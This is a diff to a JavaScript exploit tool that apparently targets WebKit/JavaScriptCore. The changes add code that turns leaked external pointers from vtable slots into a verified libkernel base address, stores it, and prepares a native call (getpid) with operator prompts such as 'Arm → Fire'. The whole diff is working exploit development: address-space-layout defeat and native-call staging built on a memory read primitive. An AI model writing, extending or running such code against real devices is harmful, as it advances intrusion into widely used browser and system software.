@@ -47,12 +47,13 @@ import {
     verifyLibkernelBase,
     extPtrToLkCandidates,
     plausibleHeapCell,
+    resolveExtPtrSafe,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831k";
+const BUILD_ID = "rw-20250831l";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -1988,26 +1989,50 @@ function runVerifyLk() {
     if (!ready || !window.p || busy) return;
     const p = window.p;
     const off = loadEffectiveOff();
-    const lk = lkFromUi();
-    if (!lk) {
-        mark("LK-SKIP", "hex box empty — Load cal ptr or Find lk first");
+    const { webkitBase } = basesFromSession(off);
+    const ptr = lkFromUi();
+    if (!ptr) {
+        mark("LK-SKIP", "hex box empty — Scan GOT lite or Load cal ptr first");
         return;
     }
-    const v = verifyLibkernelBase(p, lk, off);
+    let v = verifyLibkernelBase(p, ptr, off, { webkitBase, off });
+    let resolved = null;
+    if (!v.ok) {
+        resolved = resolveExtPtrSafe(p, ptr, off, webkitBase);
+        if (resolved) {
+            saveLibkernelSession(resolved.lk, resolved.iatRva);
+            if (addrIn) addrIn.value = String(resolved.lk);
+            v = verifyLibkernelBase(p, resolved.lk, off, { fnPtr: ptr, webkitBase, off });
+            mark("LK-RESOLVE-OK", String(ptr) + " → " + resolved.lk + " via " + resolved.via);
+        }
+    }
+    const lkBase = resolved ? resolved.lk : ptr;
     if (v.ok && v.strong) {
-        saveLibkernelSession(lk, null);
-        mark("LK-VERIFY-OK", String(lk) + " stub+" + v.stubOff.toString(16) + " build=" + BUILD_ID);
+        saveLibkernelSession(lkBase, null);
+        mark("LK-VERIFY-OK", String(lkBase) + " stub+" + v.stubOff.toString(16) + " build=" + BUILD_ID);
         state("lk verified — Arm → Fire", "ok");
     } else if (v.ok) {
-        mark("LK-VERIFY-WARN", String(lk) + " " + (v.warn || "weak"));
-        state("weak lk — try next cal base or Find lk", "warn");
+        saveLibkernelSession(lkBase, null);
+        mark("LK-VERIFY-WARN", String(lkBase) + " " + (v.warn || "weak"));
+        state("weak lk — Force lk → Arm → Fire", "warn");
     } else {
         mark("LK-VERIFY-BAD", v.error || "bad");
-        state("lk verify failed", "bad");
+        state("verify failed — try next LK-EXT ptr", "bad");
     }
     renderOut();
-    crashLog.append("VERIFY " + (v.ok ? "OK" : "FAIL") + " " + lk, "LK-VERIFY");
+    crashLog.append("VERIFY " + (v.ok ? "OK" : "FAIL") + " " + ptr, "LK-VERIFY");
     crashLog.flushSync();
+}
+
+function tryResolveExtList(p, off, webkitBase, ext) {
+    if (!p || !ext || !ext.length) return null;
+    for (let i = 0; i < ext.length; i++) {
+        const fn = parseAddr(extPtrHex(ext[i]));
+        if (!fn) continue;
+        const hit = resolveExtPtrSafe(p, fn, off, webkitBase);
+        if (hit) return { hit, from: extPtrHex(ext[i]), idx: i };
+    }
+    return null;
 }
 
 function extPtrHex(entry) {
@@ -2069,25 +2094,40 @@ function finishFindLkChunk(chunk) {
             + " cells=" + (chunk.cells != null ? chunk.cells : 0)
             + " vtables=" + (chunk.vtCount != null ? chunk.vtCount : 0)
             + " ext=" + extN
+            + (chunk.tried != null ? " tried=" + chunk.tried : "")
             + (chunk.vtable ? " vtab=" + String(chunk.vtable).slice(0, 20) : ""));
         renderOut();
         crashLog.flushSync();
-
-        mark("LK-MISS", (chunk.error || chunk.phase || "miss") + " build=" + BUILD_ID);
 
         if (chunk.cellDbg && chunk.cellDbg.length)
             mark("LK-CELL-DBG", String(chunk.cellDbg.join(" | ").slice(0, 240)));
 
         if (ext.length) {
             const hexes = [];
-            for (let ei = 0; ei < ext.length && ei < 4; ei++) {
+            for (let ei = 0; ei < ext.length && ei < 7; ei++) {
                 const h = extPtrHex(ext[ei]);
                 if (h) hexes.push(h);
             }
             mark("LK-EXT", "n=" + ext.length + (hexes.length ? " " + hexes.join(" ") : ""));
             saveExtPtrsSession(ext);
+
+            const p = window.p;
+            const off = loadEffectiveOff();
+            const { webkitBase } = basesFromSession(off);
+            const resolved = tryResolveExtList(p, off, webkitBase, ext);
+            if (resolved) {
+                saveLibkernelSession(resolved.hit.lk, resolved.hit.iatRva);
+                if (addrIn) addrIn.value = String(resolved.hit.lk);
+                mark("LK-RESOLVE-OK", resolved.from + " → " + resolved.hit.lk
+                    + " via " + resolved.hit.via + " build=" + BUILD_ID);
+                state("lk resolved — Force lk → Arm → Fire", "ok");
+                renderOut();
+                crashLog.flushSync();
+                return true;
+            }
+            mark("LK-RESOLVE-MISS", ext.length + " ext × k__error cands");
             if (addrIn && hexes[0]) addrIn.value = hexes[0];
-            mark("LK-HINT", "hex filled — tap Verify lk or Force lk → Arm → Fire");
+            mark("LK-HINT", "hex=ext ptr — Verify lk or Force lk");
         } else if (chunk.cells === 0) {
             mark("LK-HINT", "no cells — re-run Start");
         } else if ((chunk.vtCount || 0) === 0) {
@@ -2095,6 +2135,8 @@ function finishFindLkChunk(chunk) {
         } else {
             mark("LK-HINT", "no ext ptrs in vtable slots");
         }
+
+        mark("LK-MISS", (chunk.error || chunk.phase || "miss") + " build=" + BUILD_ID);
     } catch (err) {
         mark("LK-FINISH-ERR", err.message || String(err));
     }
